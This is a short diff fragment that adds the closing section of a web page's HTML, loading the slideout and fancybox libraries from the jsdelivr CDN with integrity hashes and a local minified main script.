+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
